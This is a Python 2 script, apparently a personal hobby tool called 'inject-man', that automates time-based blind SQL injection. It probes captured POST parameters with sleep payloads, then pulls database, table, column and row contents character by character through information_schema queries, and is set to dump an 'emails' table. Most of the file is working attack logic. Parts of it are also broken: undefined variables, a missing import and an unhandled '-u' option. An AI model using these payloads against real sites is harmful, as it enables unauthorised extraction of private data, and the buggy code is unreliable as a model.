#coding:utf-8
"""
Inject-man a TimeBlind inject pragaram which easy-code for customizable by nancheal
Rely on:
    lib - docopt
        - request
Usage:
    inject-man.py -f <file>
    inject-man.py -h
    inject-man.py -D
    inject-man.py -T
    inject-man.py -C
    inject-man.py --db
    inject-man.py --dbs
    inject-man.py --table
    inject-man.py -column
    inject-man.py --dump
Options:
    -f          Read a data packet capture by burpsuite or other tools
    -h          show help message
    -D          specify a database
    -T          specify a table
    -C          specify a column
    --db        show current db
    --dbs       show all of dbs
    --table     show all of table
    --column    show all of column
    --dump      show data
"""
import docopt
import requests
import datetime
from BaseHTTPServer import BaseHTTPRequestHandler
from StringIO import StringIO
#from urllib import quote
class Judge:
    """
    Class Judge
    Judge a param is injectable or not
    Base on Time-blind technique
    Use "AND" logic rather than "OR" logic for "AND" has a shorter time dely
    Params:
        type : Use FILE or URL
        target : A file name or a website URI
    Algorithm:
        if responseTime(with payload) - responseTime(without payload) > sleepTime
            it's injectable
        else
            it's not injectable
        prefix_payload specify the prefix to close code
        payload specify the exploite payload
        suffix_payload specify the suffix to close code
    """
    def __init__(self, type, target):
        self.prefix_payload = ['',' ','\' ','\" ','\') ','\") ',') ','%\'']
        self.payload = 'and sleep(1) and'
        self.suffix_payload = [' \'%\'=\'']
        self.type = type
        self.target = target
    def is_injectable(self):
        for i in self.prefix_payload:
            for j in self.suffix_payload:
                payload = i + self.payload + j
                request = Request(self.target)
                start_time = datetime.datetime.now()
                if self.type == 'FILE':
                    bodyList = request.processFile(self.target)
                    for body in bodyList:
                        data = body.format(payload)
                        post = self.dataFormat(data)
                        request.run(self.type,post)
                elif self.type == 'URL':
                    request.processUrl()
                end_time = datetime.datetime.now()
                print (end_time - start_time).seconds
                if 'tmp1' in dir():
                    tmp2 = (end_time - start_time).seconds
                else:
                    tmp1 = (end_time - start_time).seconds
                if 'tmp2' in dir():
                    if abs(tmp2 - tmp1) > 1:
                        return tmp1,i
        return 0
    def dataFormat(self,str):
        paramList = str.split(',')
        result = {}
        for i in paramList:
            tmp = i.split(':')
            result.setdefault(tmp[0],tmp[1])
        return result
class Request:
    """
    Class Request
    support two type:FILE,URL
    Support two method:GET,POST 
    """
    def __init__(self, target):
        self.target = target
    def run(self, type, body):
        if type == 'FILE':
            #file = self.target
            #bodyList = self.processFile(file)
            #for i in bodyList:
            req = requests.post(self.url, data=body, headers=self.headers)
            #print req.text
        elif type == 'URL':
            self.processUrl()
    def processFile(self,file):
        with open(file) as f:
            text = f.read()
            request = HTTPRequst(text)
            self.body = []
            if request.command == "POST":
                self.url = "http://{}{}".format(request.headers['Host'],request.path)
                self.headers = request.headers
                self.data = request.rfile.read() + '&'
                posList = self.findPos(self.data,'&')
                for i in posList:
                    bodyCode = self.data[0:i] + '{}' + '&' +self.data[i+1:]
                    body = bodyCode[:-1].replace('&',',').replace('=',':')
                    self.body.append(body)
                return self.body
            elif request.command == "GET":
                pass
    def findPos(self,str,sub):
        """
        FindPos function which find all sub's Position in str
        """
        pos = 0
        pos_list = []
        while True:
            pos = str.find(sub,pos)
            if pos<0:
                break
            pos_list.append(pos)
            pos += 1
        return pos_list   
    def processUrl(self):
        pass
class HTTPRequst(BaseHTTPRequestHandler):
    """
    HTTPRequest Prase class
    """
    def __init__(self,request_text):
        self.rfile = StringIO(request_text)
        self.raw_requestline = self.rfile.readline()
        self.error_code = self.error_message = None
        self.parse_request()
    def send_error(self,code,message):
        self.error_code = code
        self.error_message = message
#这里考虑到sleep的特性，如果采用手工注入的二分思维，可能会sleep多次，从而导致盲注时间过长
#所以我选择遍历的方法，虽然会进行多次的循环，但是只会有一次sleep，总的来说时间还是比较少的
#prefix 注入判断是确定的闭合符 ，normal_time 正常请求的响应时间
def brute(prefix,normal_time):
	#result = {}
	#DB_name = getcurrentDB(prefix,normal_time)
	#table = getTable(prefix,normal_time,DB_name)
	#result.setdefault(DB_name,table)
	#print result
	print dump(prefix,normal_time,'emails','id')
def getcurrentDB(prefix,normal_time):
	DB_length = getLength(prefix,normal_time,'length((select database()))',20)
	DB_name = getName(prefix,normal_time,'(select database())',DB_length+1)
	return DB_name
def getTable(prefix,normal_time,DB_name):
	result = {}
	table_count = getLength(prefix,normal_time,'(select count(table_name) from information_schema.tables where table_schema = \'%s\')'%(DB_name),20)
	for i in range(0,table_count): 
		table_length = getLength(prefix,normal_time,'(select length(table_name) from information_schema.tables where table_schema = \'%s\' limit %d,1)'%(DB_name,i),20)
		table_name = getName(prefix,normal_time,'(select table_name from information_schema.tables where table_schema = \'%s\' limit %d,1)'%(DB_name,i),table_length+1)
		result.setdefault(table_name,[])
	return result
def getColumn(prefix,normal_time,DB_name,table_name):
	result = []
	column_count = getLength(prefix,normal_time,'(select count(column_name) from information_schema.columns where table_schema = \'%s\' and table_name = \'%s\')'%(DB_name,table_name),20)
	for i in range(0,column_count): 
		column_length = getLength(prefix,normal_time,'(select length(column_name) from information_schema.columns where table_schema = \'%s\' and table_name = \'%s\' limit %d,1)'%(DB_name,table_name,i),20)
		column_name = getName(prefix,normal_time,'(select column_name from information_schema.columns where table_schema = \'%s\' and table_name = \'%s\' limit %d,1)'%(DB_name,table_name,i),column_length+1)
		result.append(column_name)
	return result
def dump(prefix,normal_time,table_name,column_name):
	result = []
	data_num = getLength(prefix,normal_time,'(select count(%s) from %s)'%(column_name,table_name),20)
	for i in range(0,data_num):
		data_length = getLength(prefix,normal_time,'(select length(%s) from %s limit %d,1)'%(column_name,table_name,i),20)
		data = getName(prefix,normal_time,'(select %s from %s limit %d,1)'%(column_name,table_name,i),data_length+1)
		result.append(data)
	return result
def getLength(prefix,normal_time,payload,leng):
	for i in range(1,leng):
		url = target + prefix + 'and if(%s = %d,sleep(1),0) --+' % (payload,i)
		start_time = datetime.datetime.now()
		urllib.urlopen(url)
		end_time = datetime.datetime.now()
		if (end_time - start_time).seconds - normal_time >= 1:
			return i
def getName(prefix,normal_time,payload,leng):
	name = ''
	for i in range(leng):
		for j in range(32,127):
			url = target + prefix + 'and if(ascii(substr(%s,%d,1))=%d,sleep(1),0) --+' % (payload,i,j)
			start_time = datetime.datetime.now()
			urllib.urlopen(url)
			end_time = datetime.datetime.now()
			if (end_time - start_time).seconds - normal_time >= 1:
				name += chr(j)
	return name
if __name__ == '__main__':
    Arguments = docopt.docopt(__doc__)
    if Arguments['-f']:
        demo = Judge('FILE',Arguments['<file>'])
        demo.is_injectable()
    elif Arguments['-u']:
        getRequest = Judge('URL',Arguments['<url>'])
        demo.is_injectable()